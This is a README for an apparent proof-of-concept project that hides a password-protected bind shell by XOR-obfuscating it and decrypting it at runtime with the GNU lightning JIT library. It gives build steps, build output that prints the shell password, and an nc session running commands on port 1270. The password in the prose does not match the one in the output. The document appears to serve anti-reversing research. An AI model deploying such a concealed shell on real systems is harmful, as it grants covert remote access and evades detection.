# JIT Obfuscation Proof of Concept

In my adventures I came across [GNU lightning](https://www.gnu.org/software/lightning/). Lightning generates assembly at runtime and is great for implementing a just-in-time compiler. A really neat example is [this](https://blog.dubbelboer.com/2012/11/18/brainfuck-jit.html) Brainfuck JIT compiler by Erik Dubbelboer.

Well, I thought that was pretty neat and wanted to play with it a lightning a little. However, I didn't want to code up my own fullblown VM. That would require some serious effort and I'm not *that* interested. So I wrote this little toy that xor deobfuscates a function in memory using lightning. The the bindshell is the same one I used in my [Anti-Reversing Techniques](https://leanpub.com/anti-reverse-engineering-linux) book. You can see more [here](https://github.com/antire-book).

If you don't want to compile the project yourself then you can find it on VirusTotal:

https://www.virustotal.com/#/file/1c149f2f467e0e178bb819e3a862de016239db9e4116402d11aa5030b20a54c2/detection


## Dependencies
The code was written and tested on Ubuntu 16.04 **x64**. I can't promise it works anywhere else. Furthermore, the project depends on:

1. musl
2. cmake
3. lightning

You can install musl and cmake the following command

```sh
sudo apt-get install cmake musl-dev musl-tools
```

There is no package for lightning so you'll have to download and compile it yourself.

## Compiling
To compile create a build directory, run cmake, and the type make. For example:

```sh
albinolobster@ubuntu:~/jit_obfuscation$ cd build/
albinolobster@ubuntu:~/jit_obfuscation/build$ cmake ..
-- The C compiler identification is GNU 5.4.0
-- Check for working C compiler: /usr/bin/cc
-- Check for working C compiler: /usr/bin/cc -- works
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Detecting C compile features
-- Detecting C compile features - done
-- The CXX compiler identification is GNU 5.4.0
-- Check for working CXX compiler: /usr/bin/c++
-- Check for working CXX compiler: /usr/bin/c++ -- works
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Detecting CXX compile features
-- Detecting CXX compile features - done
-- Configuring done
-- Generating done
-- Build files have been written to: /home/albinolobster/jit_obfuscation/build
albinolobster@ubuntu:~/jit_obfuscation/build$ make
Scanning dependencies of target stripBinary
[ 16%] Building CXX object stripBinary/CMakeFiles/stripBinary.dir/src/stripBinary.cpp.o
[ 33%] Linking CXX executable stripBinary
[ 33%] Built target stripBinary
Scanning dependencies of target xorFunction
[ 50%] Building CXX object xorFunction/CMakeFiles/xorFunction.dir/src/xorFunction.cpp.o
[ 66%] Linking CXX executable xorFunction
[ 66%] Built target xorFunction
Scanning dependencies of target addLDS
[ 66%] Built target addLDS
Scanning dependencies of target trouble
[ 83%] Building C object trouble/CMakeFiles/trouble.dir/src/trouble.c.o
[100%] Linking C executable trouble
The bind shell password is: rsMzp7gqOME8J5KOAVeDnmNUQb4z7pKU
[ 99%] Bind shell function obfuscated!
[100%] Built target trouble
albinolobster@ubuntu:~/jit_obfuscation/build$ 
```

## Executing the program
Simply run the "trouble" binary like so:

```sh
albinolobster@ubuntu:~/jit_obfuscation/build$ ./trouble/trouble
```

This will cause the program to begin listening on port 1270.

## Connecting to the bind shell
You'll need the bind shell password in order to successfully connect. The password is output when you compile the program. In the output above the bind shell password is "wulg2FZo17WKoZ6e5Eyyet2BNBP1ppRE". Here is an example of connecting to the bindshell:

```sh
albinolobster@ubuntu:~$ nc 127.0.0.1 1270
rsMzp7gqOME8J5KOAVeDnmNUQb4z7pKU
pwd
/home/albinolobster/jit_obfuscation/build
ls -l
total 40
-rw-rw-r-- 1 albinolobster albinolobster 12151 Aug 22 05:35 CMakeCache.txt
drwxrwxr-x 4 albinolobster albinolobster  4096 Aug 22 05:35 CMakeFiles
-rw-rw-r-- 1 albinolobster albinolobster  5499 Aug 22 05:35 Makefile
-rw-rw-r-- 1 albinolobster albinolobster  1711 Aug 22 05:35 cmake_install.cmake
drwxrwxr-x 3 albinolobster albinolobster  4096 Aug 22 05:35 stripBinary
drwxrwxr-x 3 albinolobster albinolobster  4096 Aug 22 05:35 trouble
drwxrwxr-x 3 albinolobster albinolobster  4096 Aug 22 05:35 xorFunction
exit
albinolobster@ubuntu:~$
```

## License
BSD-3-Clause
